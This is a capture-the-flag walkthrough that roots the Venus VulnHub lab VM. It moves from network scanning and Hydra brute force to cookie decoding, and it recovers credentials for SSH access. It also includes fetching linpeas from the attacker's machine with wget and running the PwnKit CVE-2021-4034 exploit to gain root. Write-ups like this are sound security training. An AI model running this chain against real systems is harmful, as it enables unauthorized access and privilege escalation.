## Full Walkthrough: Venus VulnHub CTF

### By: Houston Jones

---

### 1. Network Discovery
Used:
```bash
sudo arp-scan -l
```
Found target IP: `10.0.2.15`

---

### 2. Port Scanning
```bash
nmap -sV -Pn 10.0.2.15
```
Revealed open ports:
- 22/tcp (SSH)
- 8080/tcp (HTTP)

---

### 3. Web App Access
Visited `http://10.0.2.15:8080`, logged in as `guest:guest`, saw a Venus Monitoring page.

---

### 4. Directory Brute Force
```bash
gobuster dir -u http://10.0.2.15:8080 -w /usr/share/wordlists/dirb/common.txt
```
Found `/admin` login page.

---

### 5. Brute Force Login with Hydra
```bash
hydra -L usernames.txt -p pass -s 8080 10.0.2.15 http-post-form "/:username=^USER^&password=^PASS^:Invalid username."
```
Found usernames:
- guest
- venus
- magellan

---

### 6. Burp Suite Interception
Intercepted login form. Found `auth` cookie with Base64-encoded creds.
Decoded:
```text
guest:thrfg → ROT13 → guest:guest
```

---

### 7. Cookie Manipulation & Decoding
Swapped usernames and decoded cookie responses:
- `venus:venusiangeology1989`
- `magellan:venusiangeology1989`
- Also worked: `venus:venus`

Confirmed valid login credentials.

---

### 8. SSH Access
```bash
ssh magellan@10.0.2.15
# Password: venusiangeology1989
```
Captured user flag:
```bash
cat /home/magellan/user_flag.txt
# e799a60032068b27b8ff212b57c200b0
```

---

### 9. Privilege Escalation Preparation
Transferred linpeas:
```bash
python3 -m http.server 8000
wget http://10.0.2.7:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee output.txt
```

---

### 10. LinPEAS Output
Found vulnerability to `CVE-2021-4034` (PwnKit exploit)

---

### 11. Downloaded PwnKit Exploit
Transferred zip file from Kali → extracted on Venus
```bash
unzip CVEmain.zip
make
```

---

### 12. Root Exploit
```bash
./cve-2021-4034
whoami
# root
```

Captured root flag:
```bash
cat /root/root_flag.txt
# 2ffb8a7239d90b3d3db02a258d009c79
```

---

### ✅ Success
Rooted the Venus VulnHub VM and captured both flags.
